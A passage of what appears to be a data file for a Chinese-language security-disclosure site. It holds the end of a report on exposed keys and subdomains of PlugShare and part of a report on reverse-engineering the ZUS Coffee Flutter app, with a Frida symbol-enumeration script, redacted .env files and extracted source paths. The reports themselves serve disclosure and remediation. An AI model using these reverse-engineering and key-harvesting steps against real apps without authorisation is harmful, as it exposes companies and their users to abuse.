done",language:"bash"},{type:"list",items:["核心服务：www.plugshare.com、api.plugshare.com、auth.plugshare.com","开发与测试：developer.plugshare.com、staging.plugshare.com","帮助与支持：help.plugshare.com、faq.plugshare.com、ezchargesupport.plugshare.com","邮件与通信：email.plugshare.com、o2.email.plugshare.com、o5256.e.mail.plugshare.com","业务与分析：reporting.plugshare.com、status.plugshare.com、company.plugshare.com","合作伙伴门户：tesla.plugshare.com、vw.plugshare.com","附加服务：store.plugshare.com、photos.plugshare.com、assets.plugshare.com","营销与内容：newsroom.plugshare.com、launch.plugshare.com、roadtrip.plugshare.com","调研与反馈：survey3.plugshare.com、survey6.plugshare.com","支付与电商：pay.plugshare.com、ezcharge.plugshare.com","追踪与链接：i.clicks.plugshare.com、link.plugshare.com"]}]},{heading:"六、风险分析",icon:"fa-chart-line",accent:"#f39c12",contents:[{type:"subheading",text:"6.1 核心风险维度"},{type:"impact-grid",cards:[{icon:"fa-exclamation-circle",title:"API 滥用",desc:"公开的 API 端点可能被未授权用户访问，导致数据泄露和服务滥用",color:"red"},{icon:"fa-credit-card",title:"支付安全",desc:"暴露的 Stripe 密钥可能被用于创建恶意支付请求，造成经济损失",color:"orange"},{icon:"fa-user-shield",title:"身份认证",desc:"AWS Cognito 配置泄露可能导致身份认证绕过，威胁用户账户安全",color:"yellow"},{icon:"fa-database",title:"数据隐私",desc:"分析工具配置泄露可能导致用户行为数据被收集，侵犯用户隐私",color:"purple"}]},{type:"paragraph",text:"PlugShare 公开暴露了多个 API 端点及敏感密钥，可能导致数据泄露、账户接管、支付欺诈等严重安全风险。建议立即采取安全加固措施，移除 env.js 文件中的敏感信息，并在后端实现身份验证、速率限制、支付密钥管理等安全机制，以降低攻击风险。"}]},{heading:"七、影响范围",icon:"fa-broadcast-tower",accent:"#e74c3c",contents:[{type:"subheading",text:"7.1 受影响方"},{type:"impact-grid",cards:[{icon:"fa-users",title:"PlugShare 用户",desc:"可能导致账户接管、支付欺诈等风险，用户个人信息和支付数据面临泄露",color:"red"},{icon:"fa-building",title:"PlugShare 业务",desc:"支付 API 泄露可能导致经济损失，身份认证漏洞可能影响数据完整性",color:"orange"},{icon:"fa-cloud",title:"AWS 资源",desc:"攻击者可能利用 AWS Cognito 进行未授权访问，影响云服务安全",color:"blue"}]},{type:"paragraph",text:"该漏洞的影响范围覆盖 PlugShare 的全部用户群体和业务系统。泄露的 AWS Cognito 凭证可能导致数百万电动汽车用户的账户被接管，Stripe 密钥泄露可能造成直接的资金损失，而 28 个子域名的暴露进一步扩大了攻击面，使整个云基础设施面临被渗透的风险。"}]},{heading:"八、修复建议",icon:"fa-wrench",accent:"#16a085",contents:[{type:"subheading",text:"8.1 修复措施"},{type:"list",items:["密钥紧急轮换：立即在 AWS 控制台中创建新的 Cognito App Client，禁用旧客户端；轮换 Stripe 密钥并更新服务端配置；检查 IAM 角色权限，遵循最小权限原则","服务端验证加固：Cognito User Pool 启用 MFA、设置强密码策略、限制登录尝试次数、启用高级安全功能（异常检测）；Stripe 操作必须在服务端进行，客户端仅使用 Publishable Key","客户端凭证保护：使用 React Native 代码混淆和字符串加密；敏感凭证从服务端动态获取，不硬编码在客户端；使用 Android Keystore / iOS Keychain 存储密钥；实施 SSL Pinning 防止中间人攻击","架构改进：采用 AWS Amplify Auth 的安全最佳实践；使用 API Gateway + Lambda 代理所有敏感操作，客户端不直接持有高权限密钥；移除 env.js 文件中的所有敏感信息；定期进行移动应用安全审计和渗透测试"]},{type:"success-box",icon:"fa-check-circle",text:"修复验证：完成上述修复后，验证 env.js 不再包含任何敏感凭证；使用 curl 验证 AWS Cognito App Client ID 已更换；确认 Stripe Dashboard 中旧密钥已失效；检查 IAM 角色权限已收紧至最小权限。"}]},{heading:"九、结论",icon:"fa-flag-checkered",accent:"#2c3e50",contents:[{type:"conclusion",title:"PlugShare API 密钥泄露总结",text:"PlugShare 应用存在严重的云服务凭证泄露漏洞，env.js 文件中硬编码了 AWS Cognito、Stripe、Amplitude 等多个敏感密钥。攻击者可通过简单的 HTTP 请求获取这些凭证，进而实施账户接管、支付欺诈和 AWS 云资源未授权访问。28 个子域名的暴露进一步扩大了攻击面。建议立即移除 env.js 中的敏感信息，轮换所有泄露凭证，并在服务端实现身份验证和密钥管理机制。"},{type:"info-box",icon:"fa-lightbulb",text:"安全提示：React Native 应用的 JavaScript bundle 是可被逆向的，任何硬编码在客户端的密钥都应视为已泄露。敏感凭证必须存储在服务端，通过认证后的 API 动态下发。对于 AWS Cognito，应启用高级安全功能并限制 IAM 角色权限，遵循最小权限原则。"}]}]},{id:"zus-coffee-leak",title:"ZUS Coffee 移动应用源码泄露",date:"2025-03-26",severity:"high",cvss:8.9,description:"通过 APK 反编译分析，发现应用源码结构完全暴露，可能导致业务逻辑泄露和安全机制被绕过。",tags:[{label:"源码泄露",icon:"fa-code",color:"blue"},{label:"敏感数据泄露",icon:"fa-lock",color:"red"},{label:"Flutter",icon:"fa-mobile-alt",color:"purple"},{label:"马来西亚",icon:"fa-globe",color:"yellow"}],target:"ZUS Coffee",country:"马来西亚",originalUrl:"",framework:"Flutter / Dart",reportSections:[{heading:"善意声明",icon:"fa-heart",accent:"#e74c3c",contents:[{type:"info-box",icon:"fa-heart",text:'作为一名怀着赤诚之心的安全研究员，我谨在此郑重声明：本次安全审计的唯一目的是帮助改进系统安全性，为保护用户数据安全尽一份力。报告中所有敏感信息均已进行脱敏处理，以防被不法分子利用。我始终秉持"善意披露、负责任报告"的原则，希望通过专业的漏洞发现和及时报告，协助开发团队尽快修复安全隐患。在此过程中，我严格遵守相关法律法规，绝无任何破坏或恶意利用的企图。衷心期待通过白帽黑客与开发团队的良性互动，共同为企业的信息安全加固，为广大用户筑起更坚实的数据保护屏障。'}]},{heading:"一、漏洞概述",icon:"fa-bug",accent:"#e67e22",contents:[{type:"subheading",text:"1.1 总体概述：Web vs Mobile 安全性对比"},{type:"impact-grid",cards:[{icon:"fa-shield-alt",title:"Web 应用安全性",desc:"经检测，ZUS Coffee Web 部分整体防护措施较为完善，WAF、CloudFront、CORS 配置及认证机制均运行正常，未发现明显漏洞，开发团队做得非常出色。",color:"green"},{icon:"fa-mobile-alt",title:"移动应用安全性",desc:"移动应用基于 Flutter 开发。通过 APK 反编译、提取 libapp.so 文件及字符串分析，发现多个敏感 API 接口和硬编码敏感信息。漏洞集中在移动端，可能导致 API 滥用、数据泄露、虚假推荐操控、会话劫持及推送通知滥用等风险。",color:"red"}]},{type:"paragraph",text:"本次审计覆盖 ZUS Coffee 的 Web 应用与移动应用两条攻击面。Web 侧的防护（WAF、CloudFront CDN、CORS 白名单、认证机制）整体表现优秀，未发现可利用的高危漏洞；而移动端因 Flutter AOT 产物未进行有效混淆与加固，成为本次审计的主要风险来源。后续章节将围绕移动端漏洞展开详细分析。"},{type:"subheading",text:"1.2 应用基本信息"},{type:"paragraph",text:"ZUS Coffee 是马来西亚知名的咖啡连锁品牌，其移动应用基于 Flutter 跨平台框架开发，提供在线点单、会员积分、优惠券、支付等功能。在对 ZUS Coffee Android APK 进行安全分析时，发现应用的 Flutter 编译产物（libapp.so）可以被完整逆向，Dart 代码结构几乎完全暴露。由于应用未进行有效的代码混淆和加固，攻击者可轻松还原业务逻辑、提取 API 端点、发现硬编码密钥，进而实施业务逻辑攻击、API 滥用和用户数据窃取。"},{type:"table",headers:["属性","详情"],rows:[["应用名称","ZUS Coffee - Better Coffee For All"],["应用包名","com.zuscoffee.android"],["版本号","v3.2.0"],["平台","Android (APK)"],["技术栈","Flutter (Dart) + Firebase + 自研后端"],["CVSS 评分","8.9 (High)"]]},{type:"subheading",text:"1.3 核心发现"},{type:"impact-grid",cards:[{icon:"fa-code",title:"源码完全暴露",desc:"Flutter 编译产物 libapp.so 可被完整逆向，Dart 代码结构几乎完全暴露",color:"red"},{icon:"fa-key",title:"硬编码密钥",desc:"发现 Google API Key、Firebase 配置、Facebook Token 等多个硬编码敏感密钥",color:"orange"},{icon:"fa-network-wired",title:"API 端点泄露",desc:"提取到 v1/v3 接口完整路径，涵盖余额、购物车、结账、用户、认证等核心业务",color:"purple"},{icon:"fa-users",title:"用户数据泄露",desc:"WordPress REST API 公开暴露用户信息，可被用于定向钓鱼和身份冒用",color:"blue"}]}]},{heading:"二、Flutter 应用源码分析",icon:"fa-file-code",accent:"#c0392b",contents:[{type:"subheading",text:"2.1 分析方法"},{type:"paragraph",text:"使用自定义的 Frida 脚本（extract_functions_apk.js）对 APK 包中的 libapp.so 进行动态分析，通过 Java.perform Hook 进入目标库，枚举所有导出函数与符号，进而提取 Dart 字符串、API 路径与硬编码敏感信息。"},{type:"code",language:"javascript",code:`Java.perform(function() {
    var libName = "libapp.so";
    var lib = Module.findBaseAddress(libName);

    if (lib) {
      console.log("[+] Found " + libName + " at " + lib);

      var exports = Module.enumerateExports(libName);
      exports.forEach(function(exp) {
        console.log(
          "[EXPORT] " + exp.type + " " + exp.name + " at " + exp.address
        );
      });

      var symbols = Module.enumerateSymbols(libName);
      symbols.forEach(function(sym) {
        console.log("[SYMBOL] " + sym.name + " at " + sym.address);
      });
    } else {
      console.log("[-] Library not found");
    }
  });

});`},{type:"paragraph",text:"通过上述脚本可枚举 libapp.so 中的全部导出符号，结合 strings 命令对二进制进行字符串提取，能够还原出大量 Dart 源文件路径、API 端点以及硬编码环境变量。"}]},{heading:"三、环境变量泄露分析",icon:"fa-key",accent:"#8e44ad",contents:[{type:"subheading",text:"3.1 从 Flutter 应用提取的环境配置"},{type:"paragraph",text:"通过逆向分析 libapp.so，从 Flutter 应用中提取到三套环境配置文件（.env.prod、.env.staging、.env.dev），其中包含大量第三方服务密钥与 API 配置。以下为脱敏后的关键内容："},{type:"subheading",text:"3.2 .env.prod（生产环境）"},{type:"code",language:"bash",code:`ENVIRONMENT=production
ENV_TYPE=L

APP_NAME="ZUS Coffee"

BASE_URL=https://app.zuscoffee
API_URL_MY=$BASE_URL.com
API_URL_SG=$BASE_URL.sg
API_URL_BN=$BASE_URL.com.bn
API_URL_PH=https://appv2.zuscoffee.ph
API_URL_TH=https://app.th.zuscoffee.com

APPIER_IS_SANDBOX=false
APPIER_APP_ID_MY=xxxxxxx
APPIER_APP_ID_SG=xxxxxxx
APPIER_APP_ID_BN=xxxxxxx
APPIER_APP_ID_PH=xxxxxxx
APPIER_APP_ID_TH=xxxxxxx

ONE_SIGNAL_APP_ID=xxxxxxx
NOTIFICATION_APP_GROUP=xxxxxxx

LIVE_ACTIVITIES_APP_GROUP=xxxxxxx

FIREBASE_PROJECT_NUMBER=xxxxxxx

DATADOG_CLIENT_TOKEN=xxxxxxx
DATADOG_APP_ID=xxxxxxx

GOOGLE_API_KEY=xxxxxxx`},{type:"subheading",text:"3.3 .env.staging（预发布环境）"},{type:"code",language:"bash",code:`ENVIRONMENT=staging
ENV_TYPE=S

APP_NAME="ZUS Coffee (Staging)"

BASE_URL=https://staging.zuscoffee
API_URL_MY=$BASE_URL.com

APPIER_IS_SANDBOX=true
APPIER_APP_ID_MY=xxxxxxx

ONE_SIGNAL_APP_ID=xxxxxxx

FIREBASE_PROJECT_NUMBER=xxxxxxx

DATADOG_CLIENT_TOKEN=xxxxxxx
DATADOG_APP_ID=xxxxxxx

GOOGLE_API_KEY=xxxxxxx`},{type:"subheading",text:"3.4 .env.dev（开发环境）"},{type:"code",language:"bash",code:`ENVIRONMENT=development
ENV_TYPE=D

APP_NAME="ZUS Coffee (Dev)"

BASE_URL=https://dev.zuscoffee
API_URL_MY=$BASE_URL.com

APPIER_IS_SANDBOX=true
APPIER_APP_ID_MY=xxxxxxx

ONE_SIGNAL_APP_ID=xxxxxxx

FIREBASE_PROJECT_NUMBER=xxxxxxx

DATADOG_CLIENT_TOKEN=xxxxxxx
DATADOG_APP_ID=xxxxxxx

GOOGLE_API_KEY=xxxxxxx`},{type:"warning-box",icon:"fa-exclamation-triangle",text:"风险提示：上述环境变量包含 ApPIER、OneSignal、Firebase、Datadog、Google API Key 等多个第三方服务的生产凭证。攻击者获取这些密钥后，可滥用推送服务、伪造数据分析、消耗 API 配额，甚至访问 Firebase 数据库。建议立即轮换所有泄露的密钥，并将敏感配置迁移至服务端管理。"}]},{heading:"四、源文件列表",icon:"fa-file-code",accent:"#16a085",contents:[{type:"subheading",text:"4.1 提取到的 Dart 源文件路径"},{type:"paragraph",text:'通过 strings 命令对 libapp.so 进行字符串提取，并使用 grep "package:love_coffee" 过滤，得到了完整的 Dart 源文件清单。这些路径暴露了应用的业务模块结构，包括登录、支付、订单、优惠券、会员等核心功能。以下为部分代表性路径：'},{type:"list",items:["package:love_coffee/screens/home_loyalty_term_condition/components/loyalty_card.dart","package:love_coffee/providers/product_detail_provider.dart","package:love_coffee/screens/delete_account/delete_account.dart","package:love_coffee/screens/home_menu_main_v3/menu_page.dart","package:love_coffee/models/help_centre/help_search.dart","package:love_coffee/components/payment_details_field.dart","package:love_coffee/models/google_models/google_autocomplete.dart","package:love_coffee/screens/payment/payment_method_page.dart","package:love_coffee/components/message_border.dart","package:love_coffee/services/SharedPreference_tutorial.dart","package:love_coffee/shared_functions/badge_display.dart","package:love_coffee/services/SharedPreference_UUID.dart","package:love_coffee/screens/voucher/referee_perk_details.dart","package:love_coffee/extensions/ordinal_number.dart","package:love_coffee/screens/login_signup/components/phone_number_field.dart","package:love_coffee/providers/country_provider.dart","package:love_coffee/screens/help_centre/component/shimmer_loading.dart","package:love_coffee/models/balance_models/balance_type.dart","package:love_coffee/models/mission_models/mission.dart","package:love_coffee/models/tumbler_models/tumbler_catalogue.dart","package:love_coffee/models/voucher_models/voucher.dart","package:love_coffee/components/conditional_builder.dart","package:love_coffee/components/padded_pdf_table_row.dart","package:love_coffee/components/custom_badge.dart","package:love_coffee/components/countdown_timer_builder.dart","package:love_coffee/screens/home_order_details/components/payment_method_section.dart","package:love_coffee/shared_functions/share_dialog_logout.dart","package:love_coffee/screens/zus_balance/zus_balance_start.dart","package:love_coffee/screens/zus_balance/zus_balance_main.dart","package:love_coffee/global_variable/Global_variable.dart","package:love_coffee/models/product_models/product_category.dart","package:love_coffee/screens/help_centre/faq_category_page.dart","package:love_coffee/providers/help_centre_provider.dart","package:love_coffee/providers/home_provider.dart","package:love_coffee/screens/gift_card/gift_card_history_sent.dart","package:love_coffee/api/api_caller.dart","package:love_coffee/services/SharedPreference_rateOrderId.dart","package:love_coffee/screens/voucher/widgets/loyalty_voucher_item.dart","package:love_coffee/screens/delivery/screens/google_map_screen.dart","package:love_coffee/providers/login_provider.dart","package:love_coffee/screens/zus_balance/zus_balance_reload.dart","package:love_coffee/shared_functions/confirmation_dialogs.dart","package:love_coffee/models/user_models/user_registration.dart","package:love_coffee/screens/login_signup/components/country_prefix_dialog/country_prefix_search_bar.dart","package:love_coffee/managers/yellow_ai_manager.dart","package:love_coffee/models/referral_models/referral_info.dart","package:love_coffee/components/custom_button.dart","package:love_coffee/components/shimmer_widget.dart","package:love_coffee/models/product_models/product_alternative.dart","package:love_coffee/screens/home_page_main/home_page_main.dart","package:love_coffee/services/SharedPreference_pickup.dart","package:love_coffee/models/loyalty_modals/loyalty_zus_point_history.dart","package:love_coffee/screens/home_menu_main_v3/components/product_search_delegate.dart","package:love_coffee/providers/balance_provider.dart","package:love_coffee/screens/zus_wrapped/pages/zus_wrapped_fourth_page.dart","package:love_coffee/screens/zus_balance/zus_balance_reload_gift_card.dart","package:love_coffee/models/store_models/store.dart","package:love_coffee/screens/mission_reward/redeem_reward_details.dart","package:love_coffee/components/payment_method_field.dart","package:love_coffee/screens/voucher/voucher_details.dart","package:love_coffee/models/get_HereMaps_result.dart","package:love_coffee/screens/checkout_processing/component/out_of_stock_nested_menu.dart","package:love_coffee/screens/sms_confirmation/component/otp_field.dart","package:love_coffee/screens/home_page_main/components/home_action_button.dart","package:love_coffee/shared_functions/navigation_helper.dart","package:love_coffee/screens/product_details/widgets/prdt_hot_ice_selection.dart","package:love_coffee/shared_functions/order_method_dialog.dart","package:love_coffee/shared_functions/payment_function.dart","package:love_coffee/services/SharedPreference_buy1free1banner.dart","package:love_coffee/components/custom_bottom_widget.dart","package:love_coffee/shared_functions/date_range_picker.dart","package:love_coffee/providers/zus_wrapped_provider.dart","package:love_coffee/components/transparent_route.dart","package:love_coffee/screens/user_profile_edit/profile_register_page.dart","package:love_coffee/screens/qr_code/qr_code_scan.dart","package:love_coffee/screens/home_loyalty_term_condition/loyalty_page.dart","package:love_coffee/screens/pickup/pickup_page.dart","package:love_coffee/providers/outlet_provider.dart","package:love_coffee/models/user_models/user_balance.dart","package:love_coffee/screens/user_profile/user_profile_main.dart","package:love_coffee/models/loyalty_modals/loyalty_info.dart","package:love_coffee/models/get_api_token.dart","package:love_coffee/models/mini_game.dart","package:love_coffee/screens/gift_card/gift_card_history.dart","package:love_coffee/screens/mini_game/screens/mini_game_info.dart","package:love_coffee/models/referral_models/referee_perk.dart","package:love_coffee/managers/dynamic_link_manager.dart","package:love_coffee/providers/auth_provider.dart","package:love_coffee/shared_functions/custom_appbar.dart","package:love_coffee/models/store_models/store_condition.dart","package:love_coffee/screens/full_banner/full_banner_page.dart","package:love_coffee/screens/tutorial_screen/tutorial_main.dart","package:love_coffee/screens/product_details/widgets/product_ingredient_info.dart","package:love_coffee/models/order.dart","package:love_coffee/models/product_models/nutrition_facts.dart","package:love_coffee/screens/product_details/product_details.dart","package:love_coffee/services/SharedPreference_delivery_store.dart","package:love_coffee/screens/home_zus_points_transaction_history/zus_points_transaction_history_page.dart","package:love_coffee/screens/gift_card/gift_card_main_send.dart","package:love_coffee/models/root_product.dart","package:love_coffee/managers/molpay_manager.dart","package:love_coffee/services/firebase_analytics.dart","package:love_coffee/screens/checkout_processing/component/order_summary.dart","package:love_coffee/screens/pickup/component/pickup_shimmer_loading.dart","package:love_coffee/screens/voucher/partnership_voucher_details.dart","package:love_coffee/screens/product_details/widgets/product_upsells.dart","package:love_coffee/screens/order_feedback/order_feedback.dart","package:love_coffee/providers/banner_provider.dart","package:love_coffee/components/redeem_gift_card_overview.dart","package:love_coffee/screens/user_buy1free1_tutorial/buy_one_free_one_tutorial_page.dart","package:love_coffee/extensions/quick_action_shortcut.dart","package:love_coffee/models/balance_models/balance_redeem.dart","package:love_coffee/providers/bottom_navigation_provider.dart","package:love_coffee/screens/help_centre/component/search_bar.dart","package:love_coffee/models/country_models/country_list_option.dart","package:love_coffee/screens/mini_game/widgets/flipper.dart","package:love_coffee/services/SharedPreference_store.dart","package:love_coffee/shared_functions/shake_animation.dart","package:love_coffee/services/post_api_service.dart","package:love_coffee/providers/quick_action_provider.dart","package:love_coffee/screens/web_view/web_view_banner.dart","package:love_coffee/managers/one_signal_manager.dart","package:love_coffee/models/balance_models/balance_invoice.dart","package:love_coffee/services/SharedPreference_favoriteStore.dart","package:love_coffee/screens/voucher/widgets/referee_perk_item.dart","package:love_coffee/screens/delivery/components/delivery_search_bar.dart","package:love_coffee/shared_functions/bottom_sheet.dart","package:love_coffee/components/store_pinned_message_widget.dart","package:love_coffee/screens/home_page_main/components/merchandise_shimmer.dart","package:love_coffee/screens/country_detection/country_detection_page.dart","package:love_coffee/screens/voucher/widgets/partnership_voucher_item.dart","package:love_coffee/providers/reward_provider.dart","package:love_coffee/screens/login_signup/components/country_prefix_dialog/country_prefix_dialog.dart","package:love_coffee/screens/mini_game/screens/mini_game_main.dart","package:love_coffee/models/voucher_models/partnership_voucher.dart","package:love_coffee/models/molpay_models/molpay_result.dart","package:love_coffee/components/benefit_notice.dart","package:love_coffee/providers/day_night_provider.dart","package:love_coffee/screens/zus_balance/zus_balance_transaction_history.dart","package:love_coffee/models/user_models/user_loyalty.dart","package:love_coffee/screens/referral/referral_invite_history.dart","package:love_coffee/models/product_models/product_addon.dart","package:love_coffee/models/get_checkout_pay.dart","package:love_coffee/screens/pickup/pickup_state_outlets.dart","package:love_coffee/models/gift_card_models/gift_card_page.dart","package:love_coffee/screens/order/generate_order_receipt.dart","package:love_coffee/screens/mission_reward/mission_reward_main.dart","package:love_coffee/screens/pickup/pickup_nearby_outlets_hms.dart","package:love_coffee/models/checkout_models/checkout.dart","package:love_coffee/screens/mission_reward/mission_details.dart","package:love_coffee/extensions/duration_format.dart","package:love_coffee/screens/product_details/widgets/product_nutrition_info.dart","package:love_coffee/screens/referral/referral_qr.dart","package:love_coffee/screens/user_profile_edit/component/profile_field.dart","package:love_coffee/models/molpay_models/molpay_info.dart","package:love_coffee/screens/mini_game/screens/mini_game_history.dart","package:love_coffee/models/referral_models/referral_reward_table_row.dart","package:love_coffee/providers/referral_provider.dart","package:love_coffee/screens/home_page_main/components/home_floating_button.dart","package:love_coffee/services/Get_api_service.dart","package:love_coffee/screens/help_centre/faq_answer_page.dart","package:love_coffee/models/tumbler_models/tumbler_info.dart","package:love_coffee/services/SharedPreference_DeliverType.dart","package:love_coffee/services/SharedPreference_Auth.dart","package:love_coffee/models/balance_models/balance_html.dart","package:love_coffee/screens/sms_confirmation/component/resend_code_option.dart","package:love_coffee/models/google_models/google_place_search.dart","package:love_coffee/screens/voucher/widgets/voucher_item.dart","package:love_coffee/models/conversation.dart","package:love_coffee/screens/delivery/screens/delivery_main.dart","package:love_coffee/models/system_init.dart","package:love_coffee/screens/mission_reward/reward_coming_soon.dart","package:love_coffee/constants/constants.dart","package:love_coffee/screens/delivery/components/bottom_address_display.dart","package:love_coffee/api/api_response.dart","package:love_coffee/screens/help_centre/component/search_result_container.dart","package:love_coffee/screens/home_navigation/home_navigation.dart","package:love_coffee/screens/login_signup/components/country_prefix_dialog/country_prefix_tile.dart","package:love_coffee/models/payment_details.dart","package:love_coffee/screens/mission_reward/redeem_reward_main.dart","package:love_coffee/screens/login_signup/components/received_via_button.dart","package:love_coffee/models/store_models/store_pinned_message.dart","package:love_coffee/providers/user_provider.dart","package:love_coffee/screens/splash_screen/splash_screen.dart","package:love_coffee/components/map_sheet.dart","package:love_coffee/components/custom_search_delegate.dart","package:love_coffee/models/user_models/user_tumbler.dart","package:love_coffee/screens/product_details/widgets/product_basic_info.dart","package:love_coffee/providers/schedule_provider.dart","package:love_coffee/screens/home_menu_checkout/menu_checkout_page.dart","package:love_coffee/models/live_chat.dart","package:love_coffee/models/balance_models/balance_campaign.dart","package:love_coffee/screens/mission_reward/redeem_partnership_details.dart","package:love_coffee/screens/tumbler/tumbler_main.dart","package:love_coffee/models/popups.dart","package:love_coffee/shared_functions/arrow_animation.dart","package:love_coffee/screens/select_country/select_country.dart","package:love_coffee/models/checkout_models/cart_item.dart","package:love_coffee/components/custom_drop_down.dart","package:love_coffee/models/delivery_models/delivery_rider.dart","package:love_coffee/screens/referral/referral_journey.dart","package:love_coffee/models/get_out_of_stock_product.dart","package:love_coffee/screens/settings/components/setting_tile.dart","package:love_coffee/providers/contact_provider.dart","package:love_coffee/helper/convert_type_helper.dart","package:love_coffee/models/loyalty_notify_message.dart","package:love_coffee/models/delivery_models/delivery_address.dart","package:love_coffee/models/gift_card_models/gift_card_create.dart","package:love_coffee/providers/event_provider.dart","package:love_coffee/screens/login_signup/components/auth_agreement_section.dart","package:love_coffee/shared_functions/route_animations.dart","package:love_coffee/models/product_models/product.dart","package:love_coffee/screens/pickup/component/outlet_item.dart","package:love_coffee/models/user_models/user.dart","package:love_coffee/services/Post_api_service.dart","package:love_coffee/screens/product_details/widgets/product_bundles.dart","package:love_coffee/models/product_models/product_ingredient.dart","package:love_coffee/screens/gift_card/widgets/redeemed_gift_card.dart","package:love_coffee/enums/day_night.dart","package:love_coffee/providers/product_provider.dart","package:love_coffee/screens/help_centre/help_centre_screen.dart","package:love_coffee/models/balance_models/balance_log.dart","package:love_coffee/providers/gift_card_provider.dart","package:love_coffee/screens/order/order_receipt_preview.dart","package:love_coffee/screens/home_loyalty_faq/loyalty_faq_page.dart","package:love_coffee/extensions/stable_sort_list.dart","package:love_coffee/providers/feedback_provider.dart","package:love_coffee/screens/home_page_main/components/home_order_feedback.dart","package:love_coffee/screens/mission_reward/reward_main.dart","package:love_coffee/screens/home_order_main/home_order_main.dart","package:love_coffee/models/referral_models/referee_onboard_info.dart","package:love_coffee/shared_functions/base_model.dart","package:love_coffee/models/product_models/order_product.dart","package:love_coffee/managers/cdp_manager.dart","package:love_coffee/shared_functions/custom_toast.dart","package:love_coffee/main.dart","package:love_coffee/screens/home_order_main/components/filter.dart","package:love_coffee/components/bouncing_widget.dart","package:love_coffee/screens/gift_card/gift_card_redeem_tab.dart","package:love_coffee/providers/checkout_provider.dart","package:love_coffee/models/referral_models/referee.dart","package:love_coffee/screens/settings/settings.dart","package:love_coffee/services/location_service.dart","package:love_coffee/screens/home_general_feedback/general_feedback_page.dart","package:love_coffee/screens/home_page_main/components/home_banner.dart","package:love_coffee/models/country_models/get_countries.dart","package:love_coffee/models/user_models/user_zus_points.dart","package:love_coffee/extensions/string_ext.dart","package:love_coffee/models/gift_card_models/gift_card_init.dart","package:love_coffee/models/balance_models/balance_details.dart","package:love_coffee/screens/user_profile_edit/component/birthday_bottom_sheet.dart","package:love_coffee/models/gift_card_models/gift_card_background.dart","package:love_coffee/models/checkout_processing.dart","package:love_coffee/providers/splash_provider.dart","package:love_coffee/screens/product_details/widgets/prdt_details_bottom_display.dart","package:love_coffee/api/api_response.g.dart","package:love_coffee/shared_functions/loading_dialog.dart","package:love_coffee/components/show_clear_cart_dialog.dart","package:love_coffee/components/html_page.dart","package:love_coffee/screens/product_details/widgets/prdt_preferrence_selection.dart","package:love_coffee/services/SharedPreference_store_dropdown_menu.dart","package:love_coffee/screens/home_order_details/home_order_details_page.dart","package:love_coffee/providers/global_provider.dart","package:love_coffee/screens/product_details/widgets/product_addons.dart","package:love_coffee/models/app_banner.dart","package:love_coffee/services/sp_service.dart","package:love_coffee/screens/mini_game/models/lucky_draw_model.dart","package:love_coffee/models/balance_models/balance_reload_ref.dart","package:love_coffee/services/SharedPreference_service.dart","package:love_coffee/screens/referral/referral_main.dart","package:love_coffee/screens/gift_card/gift_card_sent_details.dart","package:love_coffee/screens/home_order_main/components/order_list_shimmer.dart","package:love_coffee/models/outlet_state.dart","package:love_coffee/configs/size_config.dart","package:love_coffee/screens/gift_card/gift_card_purchase.dart","package:love_coffee/models/get_generalFeedbacktag.dart","package:love_coffee/screens/home_menu_checkout/components/schedule_time_dropdown.dart","package:love_coffee/providers/pickup_provider.dart","package:love_coffee/models/referral_models/referral_invite_history.dart","package:love_coffee/screens/mission_reward/mission_main.dart","package:love_coffee/screens/zus_balance/zus_balance_transaction_details.dart","package:love_coffee/screens/product_details/widgets/product_reviews.dart","package:love_coffee/utils/signup_util.dart","package:love_coffee/screens/pickup/pickup_nearby_outlets.dart","package:love_coffee/screens/gift_card/gift_card_main.dart","package:love_coffee/providers/order_provider.dart","package:love_coffee/models/payment_models/payment_channel.dart","package:love_coffee/shared_functions/customer_support_dialog.dart","package:love_coffee/models/product_models/product_review.dart","package:love_coffee/screens/home_order_main/components/order_item.dart","package:love_coffee/managers/live_chat_manager.dart","package:love_coffee/screens/setup_bio/setup_biometric_screen.dart","package:love_coffee/screens/home_page_main/components/home_shimmer_loading.dart","package:love_coffee/providers/delivery_provider.dart","package:love_coffee/models/gift_card_models/gift_card.dart","package:love_coffee/shared_functions/scheduling_time_func.dart","package:love_coffee/services/SharedPreference_Delivery.dart","package:love_coffee/screens/voucher/voucher_main.dart","package:love_coffee/services/SharedPreference_faq.dart","package:love_coffee/models/gift_card_models/gift_card_campaign.dart","package:love_coffee/components/custom_alert_dialog.dart","package:love_coffee/screens/home_menu_checkout/components/menu_checkout_item_shimmer.dart","package:love_coffee/models/product_models/product_pool.dart","package:love_coffee/screens/gift_card/gift_card_tnc.dart","package:love_coffee/screens/home_order_main/components/no_order.dart","package:love_coffee/screens/gift_card/gift_card_redeemed_details.dart","package:love_coffee/screens/zus_balance/zus_balance_term.dart","package:love_coffee/components/custom_error_message.dart","package:love_coffee/screens/pickup/component/pickup_location_button.dart","package:love_coffee/screens/delivery/screens/delivery_set_address.dart","package:love_coffee/managers/freshchat_manager.dart","package:love_coffee/managers/connectivity_manager.dart","package:love_coffee/shared_functions/url_launch.dart","package:love_coffee/screens/referral/referral_registration.dart","package:love_coffee/screens/voucher/voucher_checkout.dart","package:love_coffee/screens/checkout_processing/checkout_processing_page.dart","package:love_coffee/extensions/md5_hash.dart","package:love_coffee/models/feedback_models/order_feedback.dart","package:love_coffee/models/payment_models/payment_method.dart","package:love_coffee/screens/product_details/widgets/product_extra_note_info.dart","package:love_coffee/screens/sms_confirmation/sms_confirmation.dart","package:love_coffee/extensions/list_ext.dart","package:love_coffee/screens/zus_wrapped/pages/zus_wrapped_welcome.dart","package:love_coffee/models/merch.dart","package:love_coffee/theme/style.dart","package:love_coffee/screens/login_signup/login_signup.dart","package:love_coffee/screens/gift_card/gift_card_main_redeem.dart","package:love_coffee/screens/mission_reward/redeem_reward_faq_screen.dart","package:love_coffee/models/product_models/product_tag.dart","package:love_coffee/models/help_centre/faq.dart","package:love_coffee/screens/gift_card/gift_card_history_redeemed.dart","package:love_coffee/screens/help_centre/component/live_chat_button.dart","package:love_coffee/screens/mini_game/widgets/mini_game_tnc.dart"]},{type:"paragraph",text:"完整的源文件列表超过 300 项，涵盖了应用的所有业务模块。攻击者通过分析这些文件路径即可还原应用的整体架构与业务流程，结合逆向工具可进一步获取具体实现逻辑。"}]},{heading:"测试方法与流程",icon:"fa-flask",accent:"#0d6efd",contents:[{type:"subheading",text:"移动应用测试方法"},{type:"paragraph",text:"针对 ZUS Coffee 移动应用的安全审计，整体流程分为四个阶段：APK 反编译与文件提取、字符串提取与目录结构分析、敏感 API 